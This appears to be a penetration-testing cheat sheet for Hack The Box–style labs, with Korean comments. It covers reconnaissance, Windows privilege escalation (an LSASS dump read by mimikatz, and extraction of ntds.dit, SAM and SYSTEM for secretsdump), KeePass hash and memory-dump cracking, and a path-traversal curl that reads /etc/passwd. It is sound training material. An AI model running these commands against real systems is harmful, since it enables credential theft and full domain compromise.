<details>
  <summary><strong>CHECK</strong></summary>
  

- web : `whatweb`/`curl`/`burpsuite crawler`/`all html code`
- sql : `injection`/`connect`/`enumeration`/`update`
- ftp : `upload`/`download`/`hidden files`
- http : `robots.txt`/`gobuster`/`feroxbuster`/`ffuf`/`error page`/`cookie에 따라서 redirection`/`.git`/`configuration file location`
- windows : `powershell history`/`whoami`/`inside files(password leaking,source code,configurations)`/`responder-ntlm`
- linux : `inside files(password leaking,source code,configurations)`/`env`/`open ports`

<br>

- nmap : `-sU --top-ports 100`/`-Pn`
- ffuf : `-mc all`
- netexec : `--rid-brute`/`--users`(description 확인)
- grep : `-r '@dog.htb'`
- strings : `raw data catch flag`
- gobuster : `txt,md`
- dirbuster : `~2017년도까지 대체재.`

</details>

---
<details>
  <summary><strong>Windows Privesc</strong></summary>
  
## SeDebugPrivilege
- `Task Manager > Details > choose LSASS > right click > Create dump file`
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```
mimikatz.exe

log

sekurlsa::minidump lsass.dmp

sekurlsa::logonpasswords
```

- `https://github.com/decoder-it/psgetsystem`
```powershell
. .\psgetsys.ps1

ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```

## SeTakeOwnershipPrivilege
- `https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1`
```powershell
Import-Module .\Enable-Privilege.ps1

.\EnableAllTokenPrivs.ps1

Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

takeown /f 'C:\Department Shares\Private\IT\cred.txt'

Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

## Backup Operators group
```
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

robocopy /B E:\Windows\NTDS .\ntds ntds.dit

reg save HKLM\SYSTEM system

reg save HKLM\SAM sam
```
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```


</details>

---
<details>
  <summary><strong>KeePass</strong></summary>

### 파일 찾기
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
- C 드라이브 전체에서 `.kdbx` 확장자를 가진 파일을 재귀적으로 검색
- `-ErrorAction SilentlyContinue` 옵션은 접근 권한 오류 메시지를 숨김

### 해시 추출 및 크래킹
```bash
keepass2john Database.kdbx > keepass.hash
```

```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

```
# Master password로 로그인
```

---

## KeePass Dump File Cracking
```bash
python3 poc.py <file.dmp>

# sudo apt install keepassxc
keepassxc <file.kdbx>
```
- https://github.com/matro7sh/keepass-dump-masterkey

</details>

---
<details>
  <summary><strong>PPK (PuTTY Private Key File) to PEM</strong></summary>

```bash
puttygen <file.ppk> -O private-openssh -o <file.pem>

ssh -i <file.pem> host@local
```
  
</details>

---
<details>
  <summary><strong>Hex to ASCII</strong></summary>

```bash
# password : 504073737730726440313233212131323313917181922232526273031333435373839424349505154575861657475798283869091949598103106111114115119122123126130131134135
cat password | xxd -r -p
```
</details>

---
<details>
  <summary><strong>sed</strong></summary>

```bash
sed -i '1i /cgi-bin/' test.txt
```

</details>

---
<details>
  <summary><strong>tar</strong></summary>

```bash
# 압축
tar -cf target.tar foo bar

# 압축 해제
tar -xvzf target.tar
tar -xvzf target.tar.gz
```

</details>

---
<details>
  <summary><strong>sqlite3</strong></summary>
  
```bash
sqlite3 {dbname}
.headers on   # 컬럼 이름 출력
.mode column  # 표 형식으로 출력
.tables
select * from user;
.quit
```
  
</details>

---
<details>
  <summary><strong>CURL</strong></summary>

```bash
curl --path-as-is http://10.10.10.10/../../../../etc/passwd
```
- `../../`와 같은 경로를 그대로 전달

</details>
